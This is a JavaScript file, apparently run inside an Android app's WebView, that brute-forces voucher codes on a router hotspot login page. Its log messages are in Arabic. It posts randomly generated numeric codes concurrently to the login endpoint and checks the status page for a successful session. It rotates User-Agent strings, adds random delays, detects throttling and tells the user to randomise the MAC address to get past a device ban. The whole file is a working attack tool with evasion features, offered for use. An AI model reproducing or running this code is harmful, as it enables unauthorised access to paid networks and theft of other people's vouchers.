(function() {
    try { if (window.stopFinder) window.stopFinder(); } catch(e) {}
    const CFG = window.FINDER_CONFIG;
    if (!CFG) { return; }
    let stopped = false;
    window.stopFinder = function() { stopped = true; };

    function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    // 🎭 بصمات مختلفة (User-Agent) للتظاهر بجهاز جديد
    const USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ];

    function updatePageInput(v) {
        try {
            var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"], input[id*="username"]');
            for (var i = 0; i < inputs.length; i++) {
                var inp = inputs[i];
                if (inp.id !== 'urlBar' && inp.name !== 'urlBar') {
                    inp.value = v;
                    inp.dispatchEvent(new Event('input', {bubbles:true}));
                    inp.dispatchEvent(new Event('change', {bubbles:true}));
                    break;
                }
            }
        } catch(e) {}
    }

    async function safeJson(url) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache', signal: controller.signal });
            clearTimeout(timeoutId);
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { clearTimeout(timeoutId); return null; }
    }

    function isActive(st) {
        if (!st) return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        return (u && u !== '-' && u !== 'N/A') || (ip && ip !== '-' && up && up !== '-');
    }
    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
    }
    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }

    async function resetSession(base, statusUrl) {
        log('🔄 فحص الجلسة الحالية...');
        const st = await safeJson(statusUrl);
        
        if (!st || !isActive(st)) {
            log('✓ لا توجد جلسة نشطة.');
            return true;
        }
        
        log('⚠ توجد جلسة نشطة');
        log('→ جاري تسجيل الخروج...');
        
        try { await fetch(base + '/logout?erase-cookie=yes&var=callBack', { credentials: 'include' }); } catch(e) {}
        await sleep(1000);
        try { await fetch(base + '/logout', { credentials: 'include' }); } catch(e) {}
        
        if (window.AndroidBridge && window.AndroidBridge.clearCookies) {
            window.AndroidBridge.clearCookies();
        }
        
        await sleep(3000);
        const st2 = await safeJson(statusUrl);
        if (st2 && isActive(st2)) {
            log('❌ الراوتر يرفض الخروج!');
            return false;
        }
        log('✓ تم إفراغ الجلسة.');
        return true;
    }

    async function run() {
        try {
            const base = new URL(CFG.url).origin;
            const statusUrl = base + '/status?var=callBack';
            const loginUrl = base + '/login';

            log('▶ بدء التخمين (وضع الكشف الذكي)');
            
            const resetOk = await resetSession(base, statusUrl);
            if (!resetOk) return;

            const tried = new Set((CFG.tried || []).slice(-50000));
            log('  تم تجربة ' + tried.size + ' رقم سابقاً');

            let template = { username: '', password: '', dst: base + '/', popup: 'true' };
            try {
                const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
                const doc = new DOMParser().parseFromString(html, 'text/html');
                const form = doc.querySelector('form');
                if (form) {
                    form.querySelectorAll('input').forEach(i => {
                        const n = i.getAttribute('name');
                        if (n) template[n] = i.getAttribute('value') || '';
                    });
                }
            } catch(e) { }

            // قياس RTT الابتدائي
            log('📊 قياس سرعة الشبكة...');
            const t0 = performance.now();
            await safeJson(statusUrl);
            const initialRTT = performance.now() - t0;
            log('  RTT = ' + Math.round(initialRTT) + 'ms');
            
            if (initialRTT > 2000) {
                log('⚠⚠⚠ تحذير: الشبكة بطيئة جداً من البداية!');
                log('  الراوتر قد يحظر جهازك.');
            }

            const maxVal = Math.pow(10, CFG.digits) - 1;
            let done = 0;
            let since_rest = 0;
            let routerBusy = false;
            let consecutiveHighRTT = 0;
            let warnedThrottle = false;
            
            const MAX_CONCURRENT = CFG.threads || 4;
            const DELAY_MIN = Math.max(200, CFG.pause || 300); 
            const DELAY_MAX = DELAY_MIN * 2;
            const BATCH_SIZE = CFG.statusEvery || 50;
            const BATCH_REST = 5000;
            const RETRY_DELAY = CFG.retryDelay || 1500;

            function gen() {
                for (let k = 0; k < 1000; k++) {
                    const num = Math.floor(Math.random() * (maxVal + 1));
                    const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                    if (!tried.has(v)) { 
                        tried.add(v); 
                        window.AndroidBridge.saveTried(v);
                        return v; 
                    }
                }
                return null;
            }

            async function post(v) {
                // 🎭 استخدام User-Agent مختلف لكل محاولة
                const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
                
                const body = new URLSearchParams();
                for (const k in template) body.set(k, template[k]);
                body.set('username', v);
                body.set('password', '');
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);
                
                const reqStart = performance.now();
                try {
                    const r = await fetch(loginUrl, {
                        method: 'POST', body: body.toString(), credentials: 'include',
                        headers: { 
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': ua,
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        },
                        redirect: 'manual', signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    const reqTime = performance.now() - reqStart;
                    
                    let text = '';
                    if (r.status !== 302 && r.status !== 301) text = await r.text();
                    
                    let errMsg = '', isBusy = false, isBad = false;
                    
                    if (text) {
                        if (text.includes('already authorizing')) {
                            errMsg = 'already authorizing'; isBusy = true;
                        } else {
                            const stripped = text.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
                            if (stripped.toLowerCase().includes('authorizing')) {
                                errMsg = 'already authorizing'; isBusy = true;
                            } else if (stripped.toLowerCase().includes('invalid') || stripped.toLowerCase().includes('error') || stripped.toLowerCase().includes('fail')) {
                                isBad = true;
                                const idx = Math.max(0, stripped.toLowerCase().indexOf('error') - 10);
                                errMsg = stripped.substring(idx, idx + 50).trim();
                            }
                        }
                    }
                    return { v, code: r.status, errMsg, isBusy, isBad, time: reqTime };
                } catch(e) {
                    clearTimeout(timeoutId);
                    return { v, code: 0, errMsg: 'Network Error', isBad: true, time: performance.now() - reqStart };
                }
            }

            async function worker() {
                while (done < CFG.attempts && !stopped) {
                    if (routerBusy) { await sleep(RETRY_DELAY); continue; }

                    if (since_rest >= BATCH_SIZE) {
                        log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني...');
                        since_rest = 0;
                        await sleep(BATCH_REST);
                        continue;
                    }

                    const v = gen();
                    if (!v) break;

                    done++;
                    since_rest++;

                    updatePageInput(v);
                    log('🔍 ' + v);
                    try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}

                    const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
                    await sleep(delay);
                    
                    if (stopped) break;
                    
                    const res = await post(v);

                    // 🚨 كشف الحظر الذكي: إذا كانت الاستجابة بطيئة جداً (> 2 ثانية)
                    if (res.time > 2000) {
                        consecutiveHighRTT++;
                        if (consecutiveHighRTT >= 5 && !warnedThrottle) {
                            log('');
                            log('🚨🚨🚨 تحذير خطير 🚨🚨🚨');
                            log('الراوتر يبطئ استجابته عمداً (' + Math.round(res.time) + 'ms للطلب).');
                            log('هذا يعني أن الراوتر حظر جهازك (MAC).');
                            log('');
                            log('الحلول المقترحة:');
                            log('1. أغلق الواي فاي في الهاتف لمدة دقيقة');
                            log('2. اذهب لإعدادات الواي فاي → خيارات متقدمة → اختيار MAC عشوائي');
                            log('3. أو استخدم هاتف آخر');
                            log('');
                            warnedThrottle = true;
                        }
                    } else {
                        consecutiveHighRTT = 0;
                    }

                    if (res.isBusy) {
                        log('🛑 الراوتر: ' + res.errMsg + ' → انتظار...');
                        routerBusy = true;
                        setTimeout(() => { routerBusy = false; }, RETRY_DELAY);
                    } else if (res.isBad) {
                        log('❌ ' + v + ' → ' + res.errMsg);
                    } else if (res.code > 0 && res.code !== 429 && res.code !== 503) {
                        await sleep(100);
                        const st = await safeJson(statusUrl);
                        const u = statusUser(st);
                        if (u && u === v) {
                            log('✅✅✅ وجد الكرت: ' + u);
                            window.AndroidBridge.found(u, JSON.stringify(st));
                            stopped = true;
                            return;
                        }
                        const up = uptimeSec(st && st.uptime);
                        if (st && isActive(st) && up >= 0 && up <= 20) {
                            log('✅✅✅ جلسة جديدة: ' + v);
                            window.AndroidBridge.found(v, JSON.stringify(st));
                            stopped = true;
                            return;
                        }
                    }
                }
            }

            const workers = [];
            for (let i = 0; i < MAX_CONCURRENT; i++) {
                workers.push(worker());
            }
            await Promise.all(workers);
            
            log('❌ انتهى — ' + done + ' محاولة');
            
            if (warnedThrottle) {
                log('');
                log('⚠ الراوتر يحظر هذا الجهاز. غيّر MAC أو استخدم هاتف آخر.');
            }
        } catch(e) {
            log('❌ خطأ: ' + e.message);
        }
    }

    setTimeout(run, 300);
})();
